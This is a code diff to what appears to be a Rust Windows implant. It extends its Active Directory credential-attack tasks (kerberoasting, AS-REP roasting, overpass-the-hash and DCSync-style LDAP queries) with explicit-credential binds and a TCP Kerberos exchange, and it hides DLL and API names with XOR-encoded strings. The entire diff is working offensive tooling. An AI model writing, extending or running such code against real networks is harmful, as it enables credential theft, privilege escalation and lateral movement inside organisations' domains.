@@ -680,22 +680,37 @@ fn cred_kerberoast(v: &serde_json::Value) -> TaskOutput {
     let base_dn: String = domain_fqdn.split('.').map(|p| format!("DC={}", p.to_lowercase()))
         .collect::<Vec<_>>().join(",");
 
+    let bind_user = v.get("user").and_then(|s| s.as_str())
+        .map(|u| format!("{}\\{}", domain_fqdn.split('.').next().unwrap_or("").to_uppercase(), u));
+    let bind_pass = v.get("pass").and_then(|s| s.as_str()).map(|s| s.to_string());
+
     // Enumerate SPNs via LDAP
-    let spns = match ldap_enum_spns(dc, &base_dn) {
+    let spns = match ldap_enum_spns(dc, &base_dn, bind_user.as_deref(), bind_pass.as_deref()) {
         Ok(v)  => v,
         Err(e) => return TaskOutput::failure(&format!("kerberoast: ldap: {e}")),
     };
 
-    // Load secur32 for SSPI
+    // Load sspicli.dll (Win7+) or secur32.dll for SSPI
     let secur32 = {
+        // Try sspicli.dll first (actual implementation on modern Windows)
+        let sspicli_enc = &[0x29u8,0x29,0x2A,0x33,0x39,0x36,0x33,0x74,0x3E,0x36,0x36,0x5A];
         let mut base = crate::loader::get_module_base(
-            crate::obfs::dec(&[0x29,0x3F,0x39,0x2F,0x28,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
+            crate::obfs::dec(sspicli_enc).as_ptr()
         ) as usize;
         if base == 0 {
-            let name = crate::obfs::dec(&[0x29,0x3F,0x39,0x2F,0x28,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]);
+            let name = crate::obfs::dec(sspicli_enc);
             base = unsafe { LoadLibraryA(name.as_ptr()) } as usize;
         }
-        if base == 0 { return TaskOutput::failure("kerberoast: secur32 not found"); }
+        // Fall back to secur32.dll
+        if base == 0 {
+            let secur32_enc = &[0x29u8,0x3F,0x39,0x2F,0x28,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A];
+            base = crate::loader::get_module_base(crate::obfs::dec(secur32_enc).as_ptr()) as usize;
+            if base == 0 {
+                let name = crate::obfs::dec(secur32_enc);
+                base = unsafe { LoadLibraryA(name.as_ptr()) } as usize;
+            }
+        }
+        if base == 0 { return TaskOutput::failure("kerberoast: sspicli/secur32 not found"); }
         base
     };
 
@@ -707,28 +722,30 @@ fn cred_kerberoast(v: &serde_json::Value) -> TaskOutput {
     type DelCtxFn   = unsafe extern "system" fn(*mut [usize;2]) -> i32;
     type FreeBufFn  = unsafe extern "system" fn(*mut u8) -> i32;
 
-    macro_rules! sspi_fn { ($enc:expr, $ty:ty) => { {
-        match unsafe { crate::loader::get_export_by_name(secur32, crate::obfs::dec($enc).as_ptr()) } {
-            Some(p) => unsafe { core::mem::transmute::<_, $ty>(p) },
-            None    => return TaskOutput::failure("kerberoast: sspi fn resolve failed"),
+    macro_rules! sspi_fn { ($enc:expr, $ty:ty, $fname:expr) => { {
+        let _n = crate::obfs::dec($enc);
+        let _p = unsafe { windows_sys::Win32::System::LibraryLoader::GetProcAddress(secur32 as isize, _n.as_ptr()) };
+        match _p {
+            Some(f) => unsafe { core::mem::transmute::<_, $ty>(f) },
+            None    => return TaskOutput::failure(&format!("kerberoast: resolve failed: {}", $fname)),
         }
     }}}
 
     // AcquireCredentialsHandleA
     let fn_acq  = sspi_fn!(&[0x1B,0x39,0x2B,0x2F,0x33,0x28,0x3F,0x19,0x28,0x3F,0x3E,0x3F,0x34,
-                              0x2E,0x33,0x3B,0x36,0x29,0x18,0x3B,0x34,0x3E,0x36,0x3F,0x1B,0x5A], AcqCredFn);
+                              0x2E,0x33,0x3B,0x36,0x29,0x12,0x3B,0x34,0x3E,0x36,0x3F,0x1B,0x5A], AcqCredFn, "AcquireCredentialsHandleA");
     // InitializeSecurityContextA
     let fn_isc  = sspi_fn!(&[0x13,0x34,0x33,0x2E,0x33,0x3B,0x36,0x33,0x20,0x3F,0x09,0x3F,0x39,
-                              0x2F,0x28,0x33,0x2E,0x23,0x19,0x35,0x34,0x2E,0x3F,0x22,0x2E,0x1B,0x5A], IscFn);
+                              0x2F,0x28,0x33,0x2E,0x23,0x19,0x35,0x34,0x2E,0x3F,0x22,0x2E,0x1B,0x5A], IscFn, "InitializeSecurityContextA");
     // FreeCredentialsHandle
     let fn_free = sspi_fn!(&[0x1C,0x28,0x3F,0x3F,0x19,0x28,0x3F,0x3E,0x3F,0x34,0x2E,0x33,0x3B,
-                              0x36,0x29,0x18,0x3B,0x34,0x3E,0x36,0x3F,0x5A], FreeCredFn);
+                              0x36,0x29,0x12,0x3B,0x34,0x3E,0x36,0x3F,0x5A], FreeCredFn, "FreeCredentialsHandle");
     // DeleteSecurityContext
     let fn_del  = sspi_fn!(&[0x1E,0x3F,0x36,0x3F,0x2E,0x3F,0x09,0x3F,0x39,0x2F,0x28,0x33,0x2E,
-                              0x23,0x19,0x35,0x34,0x2E,0x3F,0x22,0x2E,0x5A], DelCtxFn);
+                              0x23,0x19,0x35,0x34,0x2E,0x3F,0x22,0x2E,0x5A], DelCtxFn, "DeleteSecurityContext");
     // FreeContextBuffer
-    let fn_fbuf = sspi_fn!(&[0x1C,0x28,0x3F,0x3F,0x19,0x35,0x34,0x2E,0x3F,0x22,0x2E,0x12,0x2F,
-                              0x3C,0x3C,0x3F,0x28,0x5A], FreeBufFn);
+    let fn_fbuf = sspi_fn!(&[0x1C,0x28,0x3F,0x3F,0x19,0x35,0x34,0x2E,0x3F,0x22,0x2E,0x18,0x2F,
+                              0x3C,0x3C,0x3F,0x28,0x5A], FreeBufFn, "FreeContextBuffer");
 
     // SSPI SecBuffer / SecBufferDesc layout (manually, to avoid windows_sys SSPI structs)
     // SecBuffer:     { cb_buffer: u32, buffer_type: u32, pv_buffer: *mut u8 }
@@ -743,9 +760,44 @@ fn cred_kerberoast(v: &serde_json::Value) -> TaskOutput {
     let kerb_pkg = crate::obfs::dec(&[0x11,0x3F,0x28,0x18,0x3F,0x28,0x35,0x29,0x5A]);
     let mut cred_hdl  = [0usize; 2];
     let mut expiry    = [0u32; 2];
+
+    // Build SEC_WINNT_AUTH_IDENTITY_A if caller supplied explicit creds
+    let kerb_user_raw = v.get("user").and_then(|s| s.as_str()).unwrap_or("");
+    let kerb_pass_raw = v.get("pass").and_then(|s| s.as_str()).unwrap_or("");
+    let kerb_dom      = domain_fqdn.split('.').next().unwrap_or("").to_uppercase();
+    let _ku: Vec<u8>; let _kd: Vec<u8>; let _kp: Vec<u8>; let _auth_struct: [u8; 48];
+    let auth_data_ptr: *const u8;
+    if !kerb_user_raw.is_empty() && !kerb_pass_raw.is_empty() {
+        _ku = kerb_user_raw.bytes().collect();
+        _kd = kerb_dom.bytes().collect();
+        _kp = kerb_pass_raw.bytes().collect();
+        // SEC_WINNT_AUTH_IDENTITY_A x64 layout (48 bytes):
+        // offset 0:  User ptr (8)
+        // offset 8:  UserLength u32 (4), pad(4)
+        // offset 16: Domain ptr (8)
+        // offset 24: DomainLength u32 (4), pad(4)
+        // offset 32: Password ptr (8)
+        // offset 40: PasswordLength u32 (4)
+        // offset 44: Flags u32 (4) = 0x1 (ANSI)
+        let mut s = [0u8; 48];
+        let up = _ku.as_ptr() as u64; let dp = _kd.as_ptr() as u64; let pp = _kp.as_ptr() as u64;
+        s[0..8].copy_from_slice(&up.to_ne_bytes());
+        s[8..12].copy_from_slice(&(_ku.len() as u32).to_ne_bytes());
+        s[16..24].copy_from_slice(&dp.to_ne_bytes());
+        s[24..28].copy_from_slice(&(_kd.len() as u32).to_ne_bytes());
+        s[32..40].copy_from_slice(&pp.to_ne_bytes());
+        s[40..44].copy_from_slice(&(_kp.len() as u32).to_ne_bytes());
+        s[44..48].copy_from_slice(&1u32.to_ne_bytes());
+        _auth_struct = s;
+        auth_data_ptr = _auth_struct.as_ptr();
+    } else {
+        _ku = Vec::new(); _kd = Vec::new(); _kp = Vec::new(); _auth_struct = [0u8; 48];
+        auth_data_ptr = core::ptr::null();
+    }
+
     let acq_status = unsafe {
         fn_acq(core::ptr::null(), kerb_pkg.as_ptr(), SECPKG_CRED_OUTBOUND,
-               core::ptr::null(), core::ptr::null(), core::ptr::null(), core::ptr::null(),
+               core::ptr::null(), auth_data_ptr, core::ptr::null(), core::ptr::null(),
                &mut cred_hdl, &mut expiry)
     };
     if acq_status != 0 {
@@ -851,10 +903,14 @@ fn cred_asrep_roast(v: &serde_json::Value) -> TaskOutput {
     let base_dn: String = domain_fqdn.split('.').map(|p| format!("DC={}", p.to_lowercase()))
         .collect::<Vec<_>>().join(",");
 
+    let bind_user = v.get("user").and_then(|s| s.as_str())
+        .map(|u| format!("{}\\{}", domain_fqdn.split('.').next().unwrap_or("").to_uppercase(), u));
+    let bind_pass = v.get("pass").and_then(|s| s.as_str()).map(|s| s.to_string());
+
     // LDAP query: users with DONT_REQUIRE_PREAUTH bit set
     let users = match ldap_query_users(dc, &base_dn,
         "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!objectClass=computer))",
-        "sAMAccountName")
+        "sAMAccountName", bind_user.as_deref(), bind_pass.as_deref())
     {
         Ok(v)  => v,
         Err(e) => return TaskOutput::failure(&format!("asrep-roast: {e}")),
@@ -1290,11 +1346,14 @@ fn cred_opth(v: &serde_json::Value) -> TaskOutput {
     // AS-REQ = APPLICATION 10
     let as_req = asn1_wrap(0x6a, &kdc_req);
 
-    // Send AS-REQ to DC:88 via UDP, read AS-REP
+    // Send AS-REQ to DC:88 — try TCP first, fall back to UDP
     let dc_addr = format!("{dc}:88");
-    let as_rep = match krb_udp_exchange(&dc_addr, &as_req) {
+    let as_rep = match krb_tcp_exchange(&dc_addr, &as_req) {
         Ok(r)  => r,
-        Err(e) => return TaskOutput::failure(&format!("opth: KDC exchange failed: {e}")),
+        Err(_) => match krb_udp_exchange(&dc_addr, &as_req) {
+            Ok(r)  => r,
+            Err(e) => return TaskOutput::failure(&format!("opth: KDC exchange failed (TCP+UDP): {e}")),
+        },
     };
 
     // Parse AS-REP to extract TGT and session key
@@ -1349,16 +1408,15 @@ fn cred_opth(v: &serde_json::Value) -> TaskOutput {
 // ─── LDAP helpers ─────────────────────────────────────────────────────────────
 
 #[cfg(target_os = "windows")]
-fn ldap_enum_spns(dc: &str, base_dn: &str) -> Result<Vec<(String, String)>, String> {
-    // Returns Vec of (sAMAccountName, servicePrincipalName) pairs
+fn ldap_enum_spns(dc: &str, base_dn: &str, user: Option<&str>, pass: Option<&str>) -> Result<Vec<(String, String)>, String> {
     let raw = ldap_query_two_attrs(dc, base_dn,
         "(&(objectClass=user)(servicePrincipalName=*)(!objectClass=computer))",
-        "sAMAccountName", "servicePrincipalName")?;
+        "sAMAccountName", "servicePrincipalName", user, pass)?;
     Ok(raw)
 }
 
 #[cfg(target_os = "windows")]
-fn ldap_query_users(dc: &str, base_dn: &str, filter: &str, attr: &str) -> Result<Vec<String>, String> {
+fn ldap_query_users(dc: &str, base_dn: &str, filter: &str, attr: &str, user: Option<&str>, pass: Option<&str>) -> Result<Vec<String>, String> {
     use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;
 
     let wldap = {
@@ -1410,7 +1468,14 @@ fn ldap_query_users(dc: &str, base_dn: &str, filter: &str, attr: &str) -> Result
 
     let ver3: u32 = 3;
     unsafe { fn_setopt(ld, 0x11 /*LDAP_OPT_PROTOCOL_VERSION*/, &ver3 as *const u32 as *const u8) };
-    let bind_r = unsafe { fn_bind(ld, core::ptr::null(), core::ptr::null(), 0x0486 /*LDAP_AUTH_NEGOTIATE*/) };
+    let user_b: Vec<u8> = match user { Some(u) => u.bytes().chain(core::iter::once(0u8)).collect(), None => vec![0u8] };
+    let pass_b: Vec<u8> = match pass { Some(p) => p.bytes().chain(core::iter::once(0u8)).collect(), None => vec![0u8] };
+    let (u_ptr, p_ptr, auth_meth): (*const u8, *const u8, u32) = if user.is_some() {
+        (user_b.as_ptr(), pass_b.as_ptr(), 0x80)
+    } else {
+        (core::ptr::null(), core::ptr::null(), 0x0486)
+    };
+    let bind_r = unsafe { fn_bind(ld, u_ptr, p_ptr, auth_meth) };
     if bind_r != 0 {
         unsafe { fn_unbind(ld) };
         return Err(format!("ldap_bind_s failed: {bind_r:#x}"));
@@ -1456,7 +1521,7 @@ fn ldap_query_users(dc: &str, base_dn: &str, filter: &str, attr: &str) -> Result
 }
 
 #[cfg(target_os = "windows")]
-fn ldap_query_two_attrs(dc: &str, base_dn: &str, filter: &str, attr1: &str, attr2: &str)
+fn ldap_query_two_attrs(dc: &str, base_dn: &str, filter: &str, attr1: &str, attr2: &str, user: Option<&str>, pass: Option<&str>)
     -> Result<Vec<(String, String)>, String>
 {
     use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;
@@ -1509,7 +1574,14 @@ fn ldap_query_two_attrs(dc: &str, base_dn: &str, filter: &str, attr1: &str, attr
     if ld.is_null() { return Err("ldap_init failed".into()); }
     let ver3: u32 = 3;
     unsafe { fn_setopt(ld, 0x11, &ver3 as *const u32 as *const u8) };
-    let br = unsafe { fn_bind(ld, core::ptr::null(), core::ptr::null(), 0x0486) };
+    let user_b: Vec<u8> = match user { Some(u) => u.bytes().chain(core::iter::once(0u8)).collect(), None => vec![0u8] };
+    let pass_b: Vec<u8> = match pass { Some(p) => p.bytes().chain(core::iter::once(0u8)).collect(), None => vec![0u8] };
+    let (u_ptr, p_ptr, auth_meth): (*const u8, *const u8, u32) = if user.is_some() {
+        (user_b.as_ptr(), pass_b.as_ptr(), 0x80)
+    } else {
+        (core::ptr::null(), core::ptr::null(), 0x0486)
+    };
+    let br = unsafe { fn_bind(ld, u_ptr, p_ptr, auth_meth) };
     if br != 0 { unsafe { fn_unbind(ld) }; return Err(format!("ldap_bind_s: {br:#x}")); }
 
     let base_b:   Vec<u8> = base_dn.bytes().chain(core::iter::once(0u8)).collect();
@@ -1719,6 +1791,22 @@ fn krb_udp_exchange(dc_addr: &str, req: &[u8]) -> Result<Vec<u8>, String> {
     Ok(buf)
 }
 
+fn krb_tcp_exchange(dc_addr: &str, req: &[u8]) -> Result<Vec<u8>, String> {
+    use std::net::TcpStream;
+    use std::io::{Read, Write};
+    let mut stream = TcpStream::connect(dc_addr).map_err(|e| e.to_string())?;
+    stream.set_read_timeout(Some(std::time::Duration::from_secs(10))).ok();
+    let len = (req.len() as u32).to_be_bytes();
+    stream.write_all(&len).map_err(|e| e.to_string())?;
+    stream.write_all(req).map_err(|e| e.to_string())?;
+    let mut len_buf = [0u8; 4];
+    stream.read_exact(&mut len_buf).map_err(|e| e.to_string())?;
+    let resp_len = u32::from_be_bytes(len_buf) as usize;
+    let mut resp = vec![0u8; resp_len];
+    stream.read_exact(&mut resp).map_err(|e| e.to_string())?;
+    Ok(resp)
+}
+
 fn parse_krb_error_code(data: &[u8]) -> u32 {
     // KRB-ERROR ASN.1: find error-code field [6] INTEGER
     // Very simplified: scan for context tag [6]
@@ -1907,7 +1995,7 @@ fn enable_debug_privilege() {
 // Binary-valued attributes are returned as hex strings ("HEX:<hexbytes>").
 
 #[cfg(target_os = "windows")]
-fn ldap_query_attrs(dc: &str, base_dn: &str, filter: &str, attrs: &[&str])
+fn ldap_query_attrs(dc: &str, base_dn: &str, filter: &str, attrs: &[&str], user: Option<&str>, pass: Option<&str>)
     -> Result<Vec<(String, Vec<(String, Vec<String>)>)>, String>
 {
     use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;
@@ -1972,7 +2060,14 @@ fn ldap_query_attrs(dc: &str, base_dn: &str, filter: &str, attrs: &[&str])
     if ld.is_null() { return Err("ldap_init failed".into()); }
     let ver3: u32 = 3;
     unsafe { fn_setopt(ld, 0x11, &ver3 as *const u32 as *const u8) };
-    let br = unsafe { fn_bind(ld, core::ptr::null(), core::ptr::null(), 0x0486) };
+    let user_b: Vec<u8> = match user { Some(u) => u.bytes().chain(core::iter::once(0u8)).collect(), None => vec![0u8] };
+    let pass_b: Vec<u8> = match pass { Some(p) => p.bytes().chain(core::iter::once(0u8)).collect(), None => vec![0u8] };
+    let (u_ptr, p_ptr, auth_meth): (*const u8, *const u8, u32) = if user.is_some() {
+        (user_b.as_ptr(), pass_b.as_ptr(), 0x80)
+    } else {
+        (core::ptr::null(), core::ptr::null(), 0x0486)
+    };
+    let br = unsafe { fn_bind(ld, u_ptr, p_ptr, auth_meth) };
     if br != 0 { unsafe { fn_unbind(ld) }; return Err(format!("ldap_bind_s: {br:#x}")); }
 
     let base_b:   Vec<u8> = base_dn.bytes().chain(core::iter::once(0u8)).collect();
@@ -2088,13 +2183,17 @@ fn cred_dcsync(v: &serde_json::Value) -> TaskOutput {
         .map(|p| format!("DC={p}"))
         .collect::<Vec<_>>().join(",");
 
+    let bind_user = v.get("bind_user").and_then(|s| s.as_str())
+        .map(|u| format!("{}\\{}", domain_fqdn.split('.').next().unwrap_or("").to_uppercase(), u));
+    let bind_pass = v.get("bind_pass").and_then(|s| s.as_str()).map(|s| s.to_string());
+
     // Query target user attributes
     let user_filter = format!("(&(objectClass=user)(sAMAccountName={target}))");
     let user_attrs = match ldap_query_attrs(&dc, &base_dn, &user_filter, &[
         "sAMAccountName", "distinguishedName", "userAccountControl",
         "pwdLastSet", "lastLogon", "memberOf", "adminCount", "description",
         "servicePrincipalName", "msDS-KeyCredentialLink",
-    ]) {
+    ], bind_user.as_deref(), bind_pass.as_deref()) {
         Ok(r) => r,
         Err(e) => return TaskOutput::failure(&format!("dcsync: ldap query failed: {e}")),
     };
@@ -2104,7 +2203,7 @@ fn cred_dcsync(v: &serde_json::Value) -> TaskOutput {
     let current_user = std::env::var("USERNAME").unwrap_or_default();
     let is_da = {
         let user_filter = format!("(&(objectClass=user)(sAMAccountName={current_user}))");
-        ldap_query_attrs(&dc, &base_dn, &user_filter, &["memberOf"])
+        ldap_query_attrs(&dc, &base_dn, &user_filter, &["memberOf"], bind_user.as_deref(), bind_pass.as_deref())
             .map(|r| r.iter().any(|(_dn, attrs)| {
                 attrs.iter().any(|(k, vals)|
                     k == "memberOf" && vals.iter().any(|v| v.to_ascii_lowercase().contains("domain admins"))
